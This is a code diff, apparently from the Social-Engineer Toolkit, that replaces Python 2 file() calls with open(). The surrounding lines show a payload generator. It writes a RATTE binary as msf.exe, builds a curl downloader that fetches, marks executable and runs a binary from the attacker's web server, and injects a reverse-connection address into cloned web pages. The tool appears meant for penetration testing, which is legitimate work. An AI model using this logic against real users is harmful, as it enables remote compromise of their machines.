@@ -17,7 +17,7 @@ sys.path.append(definepath)
 operating_system = check_os()
 
 # check the config file
-fileopen = file("/etc/setoolkit/set.config", "r")
+fileopen = open("/etc/setoolkit/set.config", "r")
 for line in fileopen:
     line = line.rstrip()
     # define if we use upx encoding or not
@@ -48,7 +48,7 @@ if not os.path.isdir(setdir + "/web_clone/"):
 
 # grab ip address and SET web server interface
 if os.path.isfile(setdir + "/interface"):
-    fileopen = file(setdir + "interface", "r")
+    fileopen = open(setdir + "interface", "r")
     for line in fileopen:
         ipaddr = line.rstrip()
 
@@ -95,7 +95,7 @@ webserver = exe_name + " " + webserver
 # this is generated through payloadgen.py and lets SET know if its a RATTE
 # payload or SET payload
 if os.path.isfile(setdir + "/set.payload"):
-    fileopen = file(setdir + "/set.payload", "r")
+    fileopen = open(setdir + "/set.payload", "r")
     for line in fileopen:
         payload_selection = line.rstrip()
 else:
@@ -133,7 +133,7 @@ if payload_selection == "SETSHELL":
 
 # if we selected RATTE in our payload selection
 if payload_selection == "RATTE":
-    fileopen = file("src/payloads/ratte/ratte.binary", "rb")
+    fileopen = open("src/payloads/ratte/ratte.binary", "rb")
     data = fileopen.read()
     filewrite = open(setdir + "/msf.exe", "wb")
     host = int(len(ipaddr) + 1) * "X"
@@ -167,7 +167,7 @@ if payload_selection == "SETSHELL":
 if posix == True:
     print_info(
         "Targetting of OSX/Linux (POSIX-based) as well. Prepping posix payload...")
-    filewrite = file(setdir + "/web_clone/mac.bin", "w")
+    filewrite = open(setdir + "/web_clone/mac.bin", "w")
     payload_flags = webserver.split(" ")
     # grab osx binary name
     osx_name = generate_random_string(10, 10)
@@ -255,7 +255,7 @@ if posix == True:
     linux_name = generate_random_string(10, 10)
     downloader = "#!/usr/bin/sh\ncurl -C - -O http://%s/%s\nchmod +x %s\n./%s %s %s &" % (
         payload_flags[1], linux_name, linux_name, linux_name, payload_flags[1], payload_flags[2])
-    filewrite = file(setdir + "/web_clone/nix.bin", "w")
+    filewrite = open(setdir + "/web_clone/nix.bin", "w")
     filewrite.write(downloader)
     filewrite.close()
     shutil.copyfile(definepath + "/src/payloads/set_payloads/shell.osx",
@@ -280,8 +280,8 @@ if stager == "off" or payload_selection == "SETSHELL_HTTP":
         if os.path.isfile(setdir + "/web_clone/index.html"):
             print_status(
                 "Stager turned off, prepping direct download payload...")
-            fileopen = file(setdir + "/web_clone/index.html", "r")
-            filewrite = file(setdir + "/web_clone/index.html.3", "w")
+            fileopen = open(setdir + "/web_clone/index.html", "r")
+            filewrite = open(setdir + "/web_clone/index.html.3", "w")
             data = fileopen.read()
             # replace freehugs with ip and port
             data = data.replace("freehugs", reverse_connection)
